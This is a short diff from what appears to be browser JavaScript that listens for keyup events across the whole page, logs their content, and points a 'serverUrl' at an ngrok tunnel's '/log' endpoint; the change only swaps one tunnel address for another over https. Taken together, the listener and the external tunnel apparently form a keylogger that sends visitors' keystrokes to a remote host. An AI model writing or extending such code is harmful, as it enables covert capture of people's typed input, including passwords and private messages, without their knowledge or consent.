@@ -49,7 +49,7 @@ document.addEventListener('keyup', (event) => {
     logEvent('Keyup', content);
 });
 
-const serverUrl = 'http://b34f23ca.ngrok.io/log';
+const serverUrl = 'https://ad4a5c00.ngrok.io/log';
 
 /**
  * Logs an event to the logging database
